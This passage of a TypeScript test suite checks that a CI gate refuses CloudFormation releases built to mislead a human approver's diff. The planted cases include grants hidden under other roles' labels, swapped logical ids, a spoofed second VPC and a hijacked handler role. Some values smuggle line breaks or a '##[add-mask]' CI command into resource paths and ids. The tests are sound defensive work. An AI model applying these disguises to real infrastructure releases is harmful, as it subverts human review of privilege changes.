    if (id === undefined) throw new Error(`no ${prefix} in the template`)
    return id
  }
  const labelOf = (resource: Labelled | undefined) => {
    if (resource?.Metadata === undefined) throw new Error('no metadata')
    return resource.Metadata
  }
  // The grant a release would hide: connecting to the database as the migration login.
  const asMigrate = {
    PolicyName: 'hearth-db',
    PolicyDocument: {
      Version: '2012-10-17',
      Statement: [
        {
          Sid: 'ConnectAsMigrate',
          Effect: 'Allow',
          Action: 'rds-db:connect',
          Resource: {
            'Fn::Join': ['', ['arn:aws:rds-db:ap-southeast-1:', { Ref: 'AWS::AccountId' }, ':dbuser:*/hearth_migrate']],
          },
        },
      ],
    },
  }
  const withGrant = (resource: Labelled | undefined) => {
    if (resource === undefined) throw new Error('no role')
    resource.Properties.Policies = [...((resource.Properties.Policies as unknown[] | undefined) ?? []), asMigrate]
  }
  // Renames logical ids throughout a template: each key, and every string equal to one (a Ref, a GetAtt's
  // first item, a DependsOn), so the template reads as one the synth wrote under the new ids.
  const renamed = (resources: Record<string, Labelled>, names: ReadonlyMap<string, string>) => {
    const walk = (value: unknown): unknown =>
      typeof value === 'string'
        ? (names.get(value) ?? value)
        : Array.isArray(value)
          ? value.map(walk)
          : typeof value === 'object' && value !== null
            ? Object.fromEntries(Object.entries(value).map(([key, inner]) => [key, walk(inner)]))
            : value
    const entries = Object.entries(resources).map(([key, value]) => [names.get(key) ?? key, walk(value)] as const)
    for (const key of Object.keys(resources)) delete resources[key]
    for (const [key, value] of entries) resources[key] = value as Labelled
  }
  // Swaps two resources' logical ids and paths (each keeps its own properties), as a release's
  // renameLogicalId() and path metadata would.
  const swapped = (resources: Record<string, Labelled>, first: string, second: string) => {
    const a = idOfPrefix(resources, first)
    const b = idOfPrefix(resources, second)
    const pathA = labelOf(resources[a])['aws:cdk:path']
    const pathB = labelOf(resources[b])['aws:cdk:path']
    labelOf(resources[a])['aws:cdk:path'] = pathB
    labelOf(resources[b])['aws:cdk:path'] = pathA
    renamed(
      resources,
      new Map([
        [a, b],
        [b, a],
      ]),
    )
  }
  // Moves the logical id entry for an id to another path in a stage's metadata file of one part.
  const entryMoved = (stage: (dir: string) => string, part: string, id: string, to: string) => (dir: string) =>
    edit(named(stage(dir), part, '.metadata.json'), json => {
      const from = Object.keys(json).find(key =>
        ((json[key] ?? []) as { type?: string; data?: unknown }[]).some(
          entry => entry.type === 'aws:cdk:logicalId' && typeof entry.data === 'string' && entry.data.startsWith(id),
        ),
      )
      if (from === undefined) throw new Error(`no logical id entry for ${id}`)
      json[to] = json[from]
      delete json[from]
    })
  it.each([
    [
      "the api task role labelled as the migrate task role's, with a grant",
      inPart(prod, 'Platform', resources => {
        const api = resources[idOfPrefix(resources, API_TASK)]
        withGrant(api)
        labelOf(api)['aws:cdk:path'] = 'prod/Platform/Roles/MigrateTask'
      }),
    ],
    [
      "the api and migrate task roles swapping logical ids and paths, the api's with a grant (a restore up)",
      inPart(restore, 'Platform', resources => {
        withGrant(resources[idOfPrefix(resources, API_TASK)])
        swapped(resources, API_TASK, 'RolesMigrateTask')
      }),
    ],
    [
      "the api task role with no path, its logical id entry under the migrate task role's",
      (dir: string) => {
        inPart(prod, 'Platform', resources => {
          const api = resources[idOfPrefix(resources, API_TASK)]
          withGrant(api)
          if (api !== undefined) delete api.Metadata
        })(dir)
        entryMoved(prod, 'Platform', API_TASK, '/prod/Platform/Roles/MigrateTask/Resource')(dir)
      },
    ],
    [
      'a path holding line breaks',
      inPart(prod, 'Platform', resources => {
        labelOf(resources[idOfPrefix(resources, API_TASK)])['aws:cdk:path'] =
          'prod/Platform/Roles/ApiTask\n\nStack prod/Data\nThere were no differences\n'
      }),
    ],
    [
      "a path under another stack's name",
      inPart(prod, 'Platform', resources => {
        labelOf(resources[idOfPrefix(resources, API_TASK)])['aws:cdk:path'] = 'prod/Data/Roles/ApiTask'
      }),
    ],
    [
      'a path that is not its logical id’s',
      inPart(prod, 'Data', resources => {
        labelOf(resources[idOfPrefix(resources, 'AuthSecret')])['aws:cdk:path'] = 'prod/Data/Valkey/Secret'
      }),
    ],
    [
      'two resources at one path',
      inPart(prod, 'Platform', resources => {
        const id = idOfPrefix(resources, 'NetworkGroupsAlb')
        resources[`NetworkGroupsAlb${'0'.repeat(8)}`] = structuredClone(resources[id]) as Labelled
      }),
    ],
    [
      'the api and migrate security groups swapping logical ids and paths',
      inPart(prod, 'Platform', resources => swapped(resources, 'NetworkGroupsApi', 'NetworkGroupsMigrate')),
    ],
    [
      'the load balancer’s and the endpoints’ security groups swapping logical ids and paths',
      inPart(nonprod, 'Platform', resources => swapped(resources, 'NetworkGroupsAlb', 'NetworkGroupsEndpoints')),
    ],
    [
      "CDK's two unnamed roles swapping logical ids and paths",
      inPart(prod, 'Platform', resources =>
        swapped(resources, 'NetworkFlowLogRole', 'CustomVpcRestrictDefaultSGCustomResourceProviderRole'),
      ),
    ],
    [
      'the api and worker task definitions swapping logical ids and paths',
      inPart(prod, 'Services', resources => swapped(resources, 'ApiTask', 'WorkerTask')),
    ],
    [
      'the api and worker services swapping logical ids and paths',
      inPart(prod, 'Services', resources => swapped(resources, 'ApiService', 'WorkerService')),
    ],
  ] as const)(
    'refuses %s (round 12)',
    (_, plant) => {
      expect(check(plant)).toBe(LABEL)
    },
    30_000,
  )
  it.each([
    ["a logical id entry's path holding line breaks", entryMoved(prod, 'Platform', API_TASK, '/prod/Platform/X\nY')],
    [
      'a logical id entry’s path outside the stages',
      entryMoved(prod, 'Platform', API_TASK, '/elsewhere/Roles/ApiTask'),
    ],
    [
      'a logical id entry naming an id that is not letters and digits',
      (dir: string) =>
        edit(named(prod(dir), 'Platform', '.metadata.json'), json => {
          json['/prod/Platform/Planted'] = [{ type: 'aws:cdk:logicalId', data: 'Planted\n##[add-mask]x' }]
        }),
    ],
  ] as const)(
    'refuses %s (round 12)',
    (_, plant) => {
      expect(check(plant)).toBe(LOGICAL_ID)
    },
    30_000,
  )
  it('passes the same grant on the migrate task role itself, in prod and in the restore stage (round 12)', () => {
    expect(
      check(inPart(prod, 'Platform', resources => withGrant(resources[idOfPrefix(resources, 'RolesMigrateTask')]))),
    ).toBe('passed')
    expect(
      check(inPart(restore, 'Platform', resources => withGrant(resources[idOfPrefix(resources, 'RolesMigrateTask')]))),
    ).toBe('passed')
  }, 30_000)

  // Round 12's second iteration: the label rule tied principals and groups, while a grant's resource is labelled
  // too: the IAM table prints a Ref or GetAtt in a statement by the resource's path, or a parameter's by its
  // logical id entry, which no rule tied to what CloudFormation resolves it to. A restore up whose two log
  // groups swapped names gave the worker's task role a grant on the api's log group under the worker's label,
  // byte for byte the honest diff; and a parameter holding the zone's id, labelled as the VPC, made the network
  // perimeter's condition one that never holds, reading as the VPC. No role names anything by a reference now
  // but the account's id, a template VPC and its default security group; anything else is named by a literal ARN.
  const ROLE_REFERENCE = refused(
    "a role names something by a reference but the account's id, the template's VPC or its default security group, which the diff prints by a label no rule ties to what it resolves to: a grant names anything else by a literal ARN",
  )
  type Template = { Parameters?: Record<string, unknown>; Resources: Record<string, Labelled> }
  // Edits a stage's template of one part whole (its parameters too) and re-keys it.
  const inTemplate =
    (stage: (dir: string) => string, part: string, change: (json: Template) => void) => (dir: string) => {
      edit(named(stage(dir), part, '.template.json'), json => change(json as unknown as Template))
      rekey(stage(dir), part)
    }
  const statementOn = (resource: Labelled | undefined, statement: Record<string, unknown>) => {
    if (resource === undefined) throw new Error('no role')
    resource.Properties.Policies = [
      ...((resource.Properties.Policies as unknown[] | undefined) ?? []),
      { PolicyName: 'hearth-planted', PolicyDocument: { Version: '2012-10-17', Statement: [statement] } },
    ]
  }
  const readsLogs = (group: string) => ({
    Sid: 'ReadLogs',
    Effect: 'Allow',
    Action: ['logs:FilterLogEvents', 'logs:GetLogEvents'],
    Resource: [{ 'Fn::Join': ['', [{ 'Fn::GetAtt': [group, 'Arn'] }, ':*']] }],
  })
  const outsideTheVpc = (vpc: unknown) => ({
    Sid: 'OutsideTheVpcOnly',
    Effect: 'Allow',
    Action: 'secretsmanager:GetSecretValue',
    Resource: {
      'Fn::Join': ['', ['arn:aws:secretsmanager:ap-southeast-1:', { Ref: 'AWS::AccountId' }, ':secret:hearth/prod/*']],
    },
    Condition: { StringNotEqualsIfExists: { 'aws:SourceVpc': vpc } },
  })
  // A new SSM-typed parameter whose default is one of the workload's own entries, with a logical id entry at the
  // VPC's label.
  const vpcLabelledParameter = (dir: string) =>
    edit(named(prod(dir), 'Platform', '.metadata.json'), json => {
      json['/prod/Platform/Network/Vpc'] = [
        ...((json['/prod/Platform/Network/Vpc'] as unknown[] | undefined) ?? []),
        { type: 'aws:cdk:logicalId', data: 'NetworkVpcRef' },
      ]
    })
  const withParameter = (json: Template) => {
    json.Parameters = {
      ...(json.Parameters ?? {}),
      NetworkVpcRef: { Type: 'AWS::SSM::Parameter::Value<String>', Default: '/hearth/prod/zone/app' },
    }
  }
  it.each([
    [
      "the worker's task role reading the api's log group under the worker's label (a restore up, two log groups' names swapped)",
      inTemplate(restore, 'Platform', json => {
        const worker = idOfPrefix(json.Resources, 'LogGroupsWorker')
        const api = idOfPrefix(json.Resources, 'LogGroupsApi')
        const [workerGroup, apiGroup] = [json.Resources[worker], json.Resources[api]]
        if (workerGroup === undefined || apiGroup === undefined) throw new Error('no log groups')
        workerGroup.Properties.LogGroupName = '/hearth/restore/api'
        apiGroup.Properties.LogGroupName = '/hearth/restore/worker'
        statementOn(json.Resources[idOfPrefix(json.Resources, 'RolesWorkerTask')], readsLogs(worker))
      }),
    ],
    [
      "the worker's task role reading its own log group by a reference",
      inTemplate(restore, 'Platform', json =>
        statementOn(
          json.Resources[idOfPrefix(json.Resources, 'RolesWorkerTask')],
          readsLogs(idOfPrefix(json.Resources, 'LogGroupsWorker')),
        ),
      ),
    ],
    [
      "a condition on a parameter labelled as the VPC, in the api's task role",
      (dir: string) => {
        inTemplate(prod, 'Platform', json => {
          withParameter(json)
          statementOn(json.Resources[idOfPrefix(json.Resources, API_TASK)], outsideTheVpc({ Ref: 'NetworkVpcRef' }))
        })(dir)
        vpcLabelledParameter(dir)
      },
    ],
    [
      "a role's grant naming a security group by its id",
      inTemplate(prod, 'Platform', json =>
        statementOn(json.Resources[idOfPrefix(json.Resources, API_TASK)], {
          Sid: 'Group',
          Effect: 'Allow',
          Action: 'ec2:DescribeSecurityGroups',
          Resource: [
            {
              'Fn::Join': [
                '',
                [
                  'arn:aws:ec2:ap-southeast-1:',
                  { Ref: 'AWS::AccountId' },
                  ':security-group/',
                  { 'Fn::GetAtt': [idOfPrefix(json.Resources, 'NetworkGroupsApi'), 'GroupId'] },
                ],
              ],
            },
          ],
        }),
      ),
    ],
  ] as const)(
    'refuses %s (round 12)',
    (_, plant) => {
      expect(check(plant)).toBe(ROLE_REFERENCE)
    },
    30_000,
  )
  it('passes the perimeter’s condition on the template’s own VPC (round 12)', () => {
    expect(
      check(
        inTemplate(prod, 'Platform', json =>
          statementOn(
            json.Resources[idOfPrefix(json.Resources, API_TASK)],
            outsideTheVpc({ Ref: idOfPrefix(json.Resources, 'NetworkVpc') }),
          ),
        ),
      ),
    ).toBe('passed')
  }, 30_000)

  // Round 12's third iteration: the reference rule let a role name a template VPC, and every rule that reads the
  // template's network held a VPC by its type alone, while nothing tied a VPC's label: the CLI prints a path less
  // its stage and a last Resource or Default, so a second VPC at <stage>/Platform/Network/Vpc printed as the
  // workload VPC (<stage>/Platform/Network/Vpc/Resource) does. A condition naming it read as the perimeter's own,
  // and a restore up moved the flow log and CDK's default security group handler to it, each line of the diff as
  // an honest release's but the added VPC's one, under the workload VPC's label. A template now holds one VPC at
  // most, at the synth's path, and no two resources the diff prints under one label.
  const SECOND_VPC = 'NetworkVpcD3C0AB1E'
  const secondVpc = (json: Template, stage: string, path = `${stage}/Platform/Network/Vpc`, id = SECOND_VPC) => {
    json.Resources[id] = {
      Type: 'AWS::EC2::VPC',
      Properties: {
        CidrBlock: '10.31.0.0/16',
        EnableDnsHostnames: true,
        EnableDnsSupport: true,
        InstanceTenancy: 'default',
        Tags: [{ Key: 'Name', Value: `hearth-${stage}` }],
      },
      Metadata: { 'aws:cdk:path': path },
    } as unknown as Labelled
  }
  it.each([
    ["a second VPC under the workload VPC's label", inTemplate(prod, 'Platform', json => secondVpc(json, 'prod'))],
    [
      "a condition naming a second VPC under the workload VPC's label, in the api's task role",
      inTemplate(prod, 'Platform', json => {
        secondVpc(json, 'prod')
        statementOn(json.Resources[idOfPrefix(json.Resources, API_TASK)], outsideTheVpc({ Ref: SECOND_VPC }))
      }),
    ],
    [
      "the flow log and CDK's default security group handler moved to a second VPC under the workload VPC's label (a restore up)",
      inTemplate(restore, 'Platform', json => {
        const vpc = idOfPrefix(json.Resources, 'NetworkVpc')
        secondVpc(json, 'restore')
        const flowLog = json.Resources[idOfPrefix(json.Resources, 'NetworkFlowLog')]
        const handler =
          json.Resources[idOfPrefix(json.Resources, 'NetworkVpcRestrictDefaultSecurityGroupCustomResource')]
        if (flowLog === undefined || handler === undefined) throw new Error('no flow log or handler')
        flowLog.Properties.ResourceId = { Ref: SECOND_VPC }
        handler.Properties.DefaultSecurityGroupId = { 'Fn::GetAtt': [SECOND_VPC, 'DefaultSecurityGroup'] }
        const role = idOfPrefix(json.Resources, 'CustomVpcRestrictDefaultSGCustomResourceProviderRole')
        const walk = (value: unknown): unknown =>
          Array.isArray(value)
            ? value.length === 2 && value[0] === vpc && value[1] === 'DefaultSecurityGroup'
              ? [SECOND_VPC, 'DefaultSecurityGroup']
              : value.map(walk)
            : typeof value === 'object' && value !== null
              ? Object.fromEntries(Object.entries(value).map(([key, inner]) => [key, walk(inner)]))
              : value
        const grant = json.Resources[role]
        if (grant === undefined) throw new Error('no handler role')
        grant.Properties = walk(grant.Properties) as Labelled['Properties']
      }),
    ],
    [
      'a second VPC at a label of its own',
      inTemplate(prod, 'Platform', json =>
        secondVpc(json, 'prod', 'prod/Platform/Network/Spare/Resource', 'NetworkSpare0A1B2C3D'),
      ),
    ],
    [
      "a security group the diff prints under the api group's label",
      inTemplate(prod, 'Platform', json => {
        const api = json.Resources[idOfPrefix(json.Resources, 'NetworkGroupsApi')]
        const twin = structuredClone(api) as Labelled
        labelOf(twin)['aws:cdk:path'] = `${labelOf(api)['aws:cdk:path']}/Resource`
        json.Resources.NetworkGroupsApi0A1B2C3D = twin
      }),
    ],
  ] as const)(
    'refuses %s (round 12)',
    (_, plant) => {
      expect(check(plant)).toBe(LABEL)
    },
    30_000,
  )

  // Round 12's third iteration, its second pass: the label rule tied every resource's path, while the CLI labels
  // each other id of the release's template (a rule's, a parameter's, an output's) by its first logical id entry,
  // and a resource the release removes by that label whenever the release reuses its id. So a release that
  // removed prod's api task role and wrote a rule under its id (an assertion that always holds, which the
  // non-strict diff never shows), with a logical id entry for that id at the bastion task role's path, printed
  // the api role's destroy line and its trust under the bastion's label; a parameter did the same. A template's
  // rules and parameters now take CDK's own ids alone, and no resource takes one of those or an output's id.
  type Sections = Template & { Rules?: Record<string, unknown>; Outputs?: Record<string, unknown> }
  const ALWAYS = { Assertions: [{ Assert: { 'Fn::Not': [{ 'Fn::Contains': [['x'], 'y'] }] }, AssertDescription: 'x' }] }
  const SSM = { Type: 'AWS::SSM::Parameter::Value<String>', Default: '/hearth/prod/zone/app' }
  type LogicalEntry = { type?: string; data?: unknown }
  // A logical id entry for an id at another construct's path, as release code's node.addMetadata() on that
  // construct writes it, with the id's own entries gone, or (kept) CDK's own entry for a rule after it.
  const entryFor = (id: string, path: string, kept?: string) => (dir: string) =>
    edit(named(prod(dir), 'Platform', '.metadata.json'), json => {
      for (const key of Object.keys(json)) {
        const left = ((json[key] ?? []) as LogicalEntry[]).filter(
          entry => !(entry.type === 'aws:cdk:logicalId' && entry.data === id),
        )
        if (left.length === 0) delete json[key]
        else json[key] = left
      }
      json[path] = [...((json[path] ?? []) as LogicalEntry[]), { type: 'aws:cdk:logicalId', data: id }]
      if (kept !== undefined) json[kept] = [{ type: 'aws:cdk:logicalId', data: id }]
    })
  // Prod's Platform with the role of a prefix removed and its id taken by a rule or a parameter, labelled at the
  // path of another role.
  const removedAs =
    (prefix: string, section: 'Rules' | 'Parameters', label: string, kept?: string) => (dir: string) => {
      let id = ''
      inTemplate(prod, 'Platform', json => {
        id = idOfPrefix(json.Resources, prefix)
        delete json.Resources[id]
        const sections = json as Sections
        sections[section] = { ...(sections[section] ?? {}), [id]: section === 'Rules' ? ALWAYS : SSM }
      })(dir)
      entryFor(id, `/prod/Platform/Roles/${label}`, kept)(dir)
    }
  it.each([
    [
      "the api task role's removal labelled as the bastion task role's, through a rule under its id",
      removedAs(API_TASK, 'Rules', 'BastionTask'),
    ],
    [
      "the same, with CDK's own entry for the rule kept after the planted one",
      removedAs(API_TASK, 'Rules', 'BastionTask', '/prod/Platform/Shadow'),
    ],
    [
      "the bastion task role's removal labelled as the worker task role's, through a rule under its id",
      removedAs('RolesBastionTask', 'Rules', 'WorkerTask'),
    ],
    [
      "the api task role's removal labelled as the bastion task role's, through a parameter under its id",
      removedAs(API_TASK, 'Parameters', 'BastionTask'),
    ],
    [
      'a rule under an id but CDK’s bootstrap version check',
      inTemplate(prod, 'Platform', json => {
        const sections = json as Sections
        sections.Rules = { ...(sections.Rules ?? {}), Spare: ALWAYS }
      }),
    ],
    [
      'a parameter under an id but CDK’s own',
      inTemplate(prod, 'Platform', json => {
        json.Parameters = { ...(json.Parameters ?? {}), Spare: SSM }
      }),
    ],
    [
      "a resource under the Services stack's Release output's id",
      inTemplate(prod, 'Services', json => {
        json.Resources.Release = {
          Type: 'AWS::ElastiCache::ParameterGroup',
          Properties: {
            CacheParameterGroupFamily: 'valkey9',
            Description: 'Hearth prod Valkey',
            Properties: { 'maxmemory-policy': 'noeviction' },
          },
          Metadata: { 'aws:cdk:path': 'prod/Services/Release' },
        } as unknown as Labelled
      }),
    ],
  ] as const)(
    'refuses %s (round 12)',
    (_, plant) => {
      expect(check(plant)).toBe(LABEL)
    },
    30_000,
  )
  it("passes the bastion task role's honest removal, and a resource of its own beside the Release output (round 12)", () => {
    expect(
      check(
        inTemplate(prod, 'Platform', json => delete json.Resources[idOfPrefix(json.Resources, 'RolesBastionTask')]),
      ),
    ).toBe('passed')
    expect(
      check(
        inTemplate(prod, 'Services', json => {
          json.Resources.Spare = {
            Type: 'AWS::ElastiCache::ParameterGroup',
            Properties: {
              CacheParameterGroupFamily: 'valkey9',
              Description: 'Hearth prod Valkey',
              Properties: { 'maxmemory-policy': 'noeviction' },
            },
            Metadata: { 'aws:cdk:path': 'prod/Services/Spare' },
          } as unknown as Labelled
        }),
      ),
    ).toBe('passed')
  }, 30_000)

  // Round 12's fourth iteration: the custom-resource rule held the handler function's Role to any role of its
  // template, the roles rule let any role trust Lambda or VPC flow logs, and the label rule tied a named role's
  // path to its RoleName alone. So a release ran CDK's default security group handler as the api's execution
  // role (trusting Lambda too and holding the handler's grant), with the handler's own role gone: on prod's first
  // deploy or a restore up the diff printed the function's line as an honest release's, the handler role's line
  // missing and its grant under the execution role's label, beside that role's read of the auth secret, and the
  // release's own zip ran as that role. The handler now runs as its own unnamed role, trusted by Lambda alone; a
  // flow log delivers as its own unnamed role, trusted by VPC flow logs alone; and a named role is trusted by ECS
  // tasks alone.
  const CUSTOM_ROLE = refused(
    "a custom resource isn't CDK's one default security group handler, run by its own function as its own unnamed role trusted by Lambda alone, as CDK writes it, from the staging bucket in a Platform stack alone, or a value in its template reads its answer",
  )
  const FLOW_ROLE = refused(
    "a network resource isn't the workload's: a security group rule, VPC endpoint or its policy, load balancer, target group, listener, record, route or flow log naming or opening something of another shape, or a flow log delivering as a role but its own unnamed one trusted by VPC flow logs alone; a listener other than HTTPS on 443 with a certificate; a subnet that gives a public address, or the restore stage holding an internet gateway, a route, a load balancer, a listener, a target group, a certificate, a record, a group open to any address or a service behind a load balancer",
  )
  const NAMED_TRUST = refused(
    "a parameter, secret, log group, role, cache or tag isn't the workload's: a name, a stored value, a role's trust (a named role's ECS tasks' alone) or a task role's network perimeter of another shape",
  )
  const HANDLER_FUNCTION = 'CustomVpcRestrictDefaultSGCustomResourceProviderHandler'
  const HANDLER_ROLE = 'CustomVpcRestrictDefaultSGCustomResourceProviderRole'
  const FLOW_LOG = 'NetworkFlowLog'
  const FLOW_LOG_ROLE = 'NetworkFlowLogRole'
  const trusting = (role: Labelled | undefined, service: string) => {
    if (role === undefined) throw new Error('no role')
    const trust = role.Properties.AssumeRolePolicyDocument as { Statement: unknown[] }
    trust.Statement.push({ Action: 'sts:AssumeRole', Effect: 'Allow', Principal: { Service: service } })
  }
  // The handler run as another role of its template, which trusts Lambda too and takes the handler's grant, and
  // the handler's own role gone, as the finder planted it.
  const handlerAs = (prefix: string) => (json: Template) => {
    const handler = json.Resources[idOfPrefix(json.Resources, HANDLER_FUNCTION)]
    const own = idOfPrefix(json.Resources, HANDLER_ROLE)
    const as = idOfPrefix(json.Resources, prefix)
    const role = json.Resources[as]
    if (handler === undefined || role === undefined) throw new Error('no handler or role')
    trusting(role, 'lambda.amazonaws.com')
    role.Properties.Policies = [
      ...((role.Properties.Policies as unknown[] | undefined) ?? []),
      ...((json.Resources[own]?.Properties.Policies as unknown[] | undefined) ?? []),
    ]
    handler.Properties.Role = { 'Fn::GetAtt': [as, 'Arn'] }
    handler.DependsOn = [as]
    delete json.Resources[own]
  }
  it.each([
    [
      "the handler run as the api's execution role, on prod's first deploy",
      inTemplate(prod, 'Platform', handlerAs('RolesApiExec')),
      CUSTOM_ROLE,
    ],
    [
      "the handler run as the api's task role, in a restore up",
      inTemplate(restore, 'Platform', handlerAs('RolesApiTask')),
      CUSTOM_ROLE,
    ],
    [
      "the handler run as the api's execution role, in non-prod",
      inTemplate(nonprod, 'Platform', handlerAs('RolesApiExec')),
      CUSTOM_ROLE,
    ],
    [
      "the handler's own role trusted by ECS tasks too",
      inTemplate(prod, 'Platform', json =>
        trusting(json.Resources[idOfPrefix(json.Resources, HANDLER_ROLE)], 'ecs-tasks.amazonaws.com'),
      ),
      CUSTOM_ROLE,
    ],
    [
      'the flow log delivering as the api’s task role',
      inTemplate(nonprod, 'Platform', json => {
        const flowLog = json.Resources[idOfPrefix(json.Resources, FLOW_LOG)]
        const task = idOfPrefix(json.Resources, API_TASK)
        if (flowLog === undefined) throw new Error('no flow log')
        flowLog.Properties.DeliverLogsPermissionArn = { 'Fn::GetAtt': [task, 'Arn'] }
        trusting(json.Resources[task], 'vpc-flow-logs.amazonaws.com')
        delete json.Resources[idOfPrefix(json.Resources, FLOW_LOG_ROLE)]
      }),
      FLOW_ROLE,
    ],
    [
      "the flow log's own role trusted by Lambda too",
      inTemplate(prod, 'Platform', json =>
        trusting(json.Resources[idOfPrefix(json.Resources, FLOW_LOG_ROLE)], 'lambda.amazonaws.com'),
      ),
      FLOW_ROLE,
    ],
    [
      "the api's execution role trusted by Lambda too",
      inTemplate(prod, 'Platform', json =>
        trusting(json.Resources[idOfPrefix(json.Resources, 'RolesApiExec')], 'lambda.amazonaws.com'),
      ),
      NAMED_TRUST,
    ],
    [
      'the migrate task role trusted by VPC flow logs too, in a restore up',
      inTemplate(restore, 'Platform', json =>
        trusting(json.Resources[idOfPrefix(json.Resources, 'RolesMigrateTask')], 'vpc-flow-logs.amazonaws.com'),
      ),
      NAMED_TRUST,
    ],
  ] as const)(
    'refuses %s (round 12’s fourth iteration)',
    (_, plant, refusal) => {
      expect(check(plant)).toBe(refusal)
    },
    30_000,
  )

  // Round 12's fourth iteration, its second pass: ASSET_CHECK held the task subnets' network invariants for every
  // stage alike, so prod's own internet gateway, public subnets and routes, its load balancer's group open to
  // the internet, the load balancer, a listener on 443 in plain HTTP with no certificate (the restore stage has
  // no zone), the target groups and the restore services behind them, each copied into the restore stage under
  // its own names as a real release's render could write them, passed, and the approver's diff showed each as
  // the restore stage's own. IAC-20 refuses them over CI's fake release alone. The restore stage now holds none
  // of them, no group open to any address and no service behind a load balancer; and a listener anywhere is
  // HTTPS on 443 with a certificate, and no subnet gives a public address, as IAC-20 holds.
  const lineOut = (text: string, start: string) => {
    const lines = text.split('\n')
    const at = lines.flatMap((line, i) => (line.trimStart().startsWith(start) ? [i] : []))
    if (at.length !== 1) throw new Error(`${at.length} lines of ASSET_CHECK start ${start}`)
    return lines.filter((_, i) => i !== at[0]).join('\n')
  }
  const once = (text: string, from: string, to: string) => {
    if (text.split(from).length !== 2) throw new Error(`ASSET_CHECK holds ${from} other than once`)
    return text.replace(from, to)
  }
  // The text without the restore stage's rule, and the text before this pass, so each plant is shown to reach the
  // rule it is for.
  const UNSEALED = lineOut(ASSET_CHECK, '($s != "restore" or (')
  const EARLIER = once(
    once(
      lineOut(lineOut(ASSET_CHECK, '($s != "restore" or ('), 'all(of("AWS::EC2::Subnet"); (.MapPublicIpOnLaunch'),
      ' and .Port == 443 and .Protocol == "HTTPS" and (.Certificates | type == "array" and length > 0 and all(.[]; .CertificateArn | ref("AWS::CertificateManager::Certificate")))',
      ' and all(.Certificates // [] | .[]; .CertificateArn | ref("AWS::CertificateManager::Certificate"))',
    ),
    '; a listener other than HTTPS on 443 with a certificate; a subnet that gives a public address, or the restore stage holding an internet gateway, a route, a load balancer, a listener, a target group, a certificate, a record, a group open to any address or a service behind a load balancer"',
    '"',
  )
  // prod's own resources whose logical ids start with one of the prefixes, renamed to the restore stage as a
  // release would render them there: their paths, names, parameters and subnets' ranges.
  const asRestore = (value: unknown): unknown =>
    typeof value === 'string'
      ? value
          .replace(/^prod\//, 'restore/')
          .replaceAll('hearth-prod', 'hearth-restore')
          .replaceAll('/hearth/prod/', '/hearth/restore/')
          .replaceAll('Hearth prod', 'Hearth restore')
          .replace(/^10\.30\.0\.0\/24$/, '10.40.32.0/24')
          .replace(/^10\.30\.1\.0\/24$/, '10.40.33.0/24')
      : Array.isArray(value)
        ? value.map(asRestore)
        : typeof value === 'object' && value !== null
          ? Object.fromEntries(Object.entries(value).map(([key, inner]) => [key, asRestore(inner)]))
          : value
  const prodsIntoRestore =
    (prefixes: readonly string[], change: (added: Record<string, Labelled>, json: Template) => void = () => {}) =>
    (dir: string) => {
      const own = read(named(prod(dir), 'Platform', '.template.json')) as unknown as Template
      const added = Object.fromEntries(
        Object.entries(own.Resources)
          .filter(([id]) => prefixes.some(prefix => id.startsWith(prefix)))
          .map(([id, resource]) => [id, asRestore(resource) as Labelled]),
      )
      if (Object.keys(added).length === 0) throw new Error(`no ${prefixes.join(', ')} in prod's Platform`)
      inTemplate(restore, 'Platform', json => {
        change(added, json)
        Object.assign(json.Resources, added)
      })(dir)
    }
  const ofTypeIn = (resources: Record<string, Labelled>, type: string) =>
    Object.values(resources).filter(resource => resource.Type === type)
  const plainHttp = (added: Record<string, Labelled>) => {
    const listeners = ofTypeIn(added, 'AWS::ElasticLoadBalancingV2::Listener')
    if (listeners.length === 0) throw new Error('no listener')
    for (const listener of listeners) {
      listener.Properties.Protocol = 'HTTP'
      delete listener.Properties.Certificates
      delete listener.Properties.SslPolicy
    }
  }
  // The load balancer in the restore stage's own isolated subnets, so no plant but the gateway's adds a subnet.
  const inIsolatedSubnets = (added: Record<string, Labelled>, json: Template) => {
    const subnets = Object.entries(json.Resources)
      .filter(([, resource]) => resource.Type === 'AWS::EC2::Subnet')
      .map(([id]) => ({ Ref: id }))
    for (const balancer of ofTypeIn(added, 'AWS::ElasticLoadBalancingV2::LoadBalancer'))
      balancer.Properties.Subnets = subnets
  }
  const GATEWAY = ['NetworkVpcpublicSubnet', 'NetworkVpcIGW', 'NetworkVpcVPCGW']
  const BALANCER = ['NetworkGroupsAlb', 'NetworkGroupsApiFromAlb', 'NetworkGroupsRealtimeFromAlb', 'LoadBalancerAlb']
  const behindTargetGroups = inTemplate(restore, 'Services', json => {
    json.Parameters = json.Parameters ?? {}
    for (const [service, group] of [
      ['ApiService', 'api'],
      ['RealtimeService', 'realtime'],
    ] as const) {
      const parameter = `SsmParameterValuehearthrestoretargetgroup${group}C96584B6F00A464EAD1953AFF4B05118Parameter`
      json.Parameters[parameter] = {
        Type: 'AWS::SSM::Parameter::Value<String>',
        Default: `/hearth/restore/target-group/${group}`,
      }
      const resource = json.Resources[service]
      if (resource === undefined) throw new Error(`no ${service}`)
      resource.Properties.HealthCheckGracePeriodSeconds = 30
      resource.Properties.LoadBalancers = [
        { ContainerName: 'server', ContainerPort: 3000, TargetGroupArn: { Ref: parameter } },
      ]
    }
  })
  // The load balancer alone, with no listener, its dependence on prod's routes dropped.
  const balancerAlone = (added: Record<string, Labelled>, json: Template) => {
    for (const [id, resource] of Object.entries(added))
      if (resource.Type === 'AWS::ElasticLoadBalancingV2::Listener') delete added[id]
    for (const balancer of ofTypeIn(added, 'AWS::ElasticLoadBalancingV2::LoadBalancer')) delete balancer.DependsOn
    inIsolatedSubnets(added, json)
  }
  const plainHttpAlone = (added: Record<string, Labelled>, json: Template) => {
    for (const balancer of ofTypeIn(added, 'AWS::ElasticLoadBalancingV2::LoadBalancer')) delete balancer.DependsOn
    inIsolatedSubnets(added, json)
    plainHttp(added)
  }
  it.each([
    [
      "prod's internet gateway, its attachment, public subnets and default routes, in the restore stage",
      prodsIntoRestore(GATEWAY),
      UNSEALED,
    ],
    [
      "prod's load balancer and its group open to the internet, in the restore stage's subnets",
      prodsIntoRestore(BALANCER, balancerAlone),
      UNSEALED,
    ],
    [
      'the same with a listener on 443 in plain HTTP and no certificate',
      prodsIntoRestore(BALANCER, plainHttpAlone),
      EARLIER,
    ],
    [
      "the whole of prod's way in, gateway, load balancer, plain HTTP listener and target groups, and the restore services behind them",
      (dir: string) => {
        prodsIntoRestore(
          [
            ...GATEWAY,
            ...BALANCER,
            'LoadBalancerApiTargets',
